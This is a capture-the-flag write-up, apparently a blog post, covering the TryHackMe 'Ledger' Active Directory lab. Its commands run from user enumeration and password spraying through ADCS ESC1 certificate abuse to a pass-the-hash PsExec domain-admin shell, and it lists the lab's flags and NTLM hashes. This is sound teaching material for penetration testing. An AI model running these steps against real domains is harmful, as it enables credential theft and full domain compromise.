---
layout: writeup
name: "Ledger"
platform: "TryHackMe"
category: "thm"
difficulty: "Hard"
permalink: /writeups/thm/ledger/
os: "TryHackMe"
date: 2026-02-25
pwned: true
---
# 🧪 TryHackMe - Ledger

**Platform:** TryHackMe  
**IP Address:** 10.201.84.72  
**Difficulty:** Hard  

![proof](https://raw.githubusercontent.com/inkedqt/ctf-writeups/main/Other/THM/proofs/thm_ledger.png)

---

## 🧭 Overview

Ledger was an **Active Directory**-based machine that simulated a hardened corporate environment with ADCS (Active Directory Certificate Services).  
Key attack chain: **Enumeration → Default Password Spray → ADCS ESC1 abuse → Certipy → Hash extraction → Lateral Movement → DA compromise**.  

---

## 🔍 Enumeration

### Nmap

```bash
rustscan --ulimit 5000 -a $target -- -sC -sV -Pn -oN nmap_full
```

- Dozens of ports open (classic DC): **LDAP, Kerberos, SMB, RDP, ADCS over HTTP/HTTPS**  
- Domain: `thm.local`  
- Host: `LABYRINTH`  

### User Enumeration

RID brute to pull valid users:

```bash
netexec smb $target -u '' -p '' --rid-brute | grep -i 'sidtypeuser' | awk '{print$6}' | cut -d '\' -f2 | tee userlist2.txt
```

Found **493 users**.  

LDAP enum leaked creds in **description field**:

```bash
netexec ldap $target -u '' -p '' --users
# SUSANNA_MCKNIGHT  -  Please change it: CHANGEME2023!
# IVY_WILLIS        -  Please change it: CHANGEME2023!
```

### Kerberos (AS-REP Roast)

```bash
impacket-GetNPUsers thm.local/ -dc-ip $target -usersfile userlist2.txt -outputfile hashes.txt
```

Dumped multiple AS-REP hashes, but **no crack with rockyou**.  

---

## 💥 Exploitation

### RDP Login (Password Spray)

Used the leaked default password across all users:

```bash
netexec rdp $target -u userlist2.txt -p 'CHANGEME2023!'
```

Valid logins:
- `SUSANNA_MCKNIGHT:CHANGEME2023!`
- `IVY_WILLIS:CHANGEME2023!`

Got RDP shell:

```bash
xfreerdp3 /v:$target /u:SUSANNA_MCKNIGHT /p:'CHANGEME2023!' /cert:ignore
```

**User flag:**  
`THM{ENUMERATION_IS_THE_KEY}`  

---

## 🔑 Privilege Escalation

### ADCS Enumeration

```bash
certipy-ad find -u 'SUSANNA_MCKNIGHT' -p 'CHANGEME2023!' -dc-ip $target -vulnerable
```

- Found vulnerable **ESC1 template** (`ServerAuth`).  
- Allows requesting certs for arbitrary users with client authentication.  

### ESC1 Exploit (Administrator)

```bash
certipy-ad req   -u 'SUSANNA_MCKNIGHT@thm.local' -p 'CHANGEME2023!'   -dc-ip $target -target 'labyrinth.thm.local'   -ca 'thm-LABYRINTH-CA' -template 'ServerAuth'   -upn 'Administrator@thm.local'
```

Generated `administrator.pfx`.  

Authenticate and dump hash:

```bash
certipy-ad auth -pfx 'administrator.pfx' -dc-ip $target
# NTLM: aad3b435b51404eeaad3b435b51404ee:07d677a6cf40925beb80ad6428752322
```

Account restrictions blocked login, so pivot was needed.  

### BloodHound Analysis

Dumped and ingested BloodHound data:

```bash
netexec ldap $target -u SUSANNA_MCKNIGHT -p 'CHANGEME2023!' --bloodhound --collection All --dns-server $target
```

BloodHound identified **BRADLEY_ORTIZ** as viable escalation path.  

### ESC1 Exploit (BRADLEY_ORTIZ)

```bash
certipy-ad req   -u 'SUSANNA_MCKNIGHT@thm.local' -p 'CHANGEME2023!'   -dc-ip $target -target 'labyrinth.thm.local'   -ca 'thm-LABYRINTH-CA' -template 'ServerAuth'   -upn 'BRADLEY_ORTIZ@thm.local'
```

Auth and hash retrieval:

```bash
certipy-ad auth -pfx 'bradley_ortiz.pfx' -dc-ip $target
# NTLM: aad3b435b51404eeaad3b435b51404ee:16ec31963c93240962b7e60fd97b495d
```

### DA Shell via PsExec

```bash
impacket-psexec bradley_ortiz@$target -hashes :16ec31963c93240962b7e60fd97b495d
```

Rooted the box!  

**Root flag:**  
`THM{THE_BYPASS_IS_CERTIFIED!}`  

---

## 📝 Lessons Learned

- Always check **LDAP description fields** for default or weak passwords.  
- **Password spraying + default creds** is still effective in AD environments.  
- ADCS **ESC1 template abuse** is a reliable path to escalation when Kerberos roasting fails.  
- BloodHound is invaluable when **Administrator** is restricted/disabled—pivot to other accounts with equivalent access.  

---

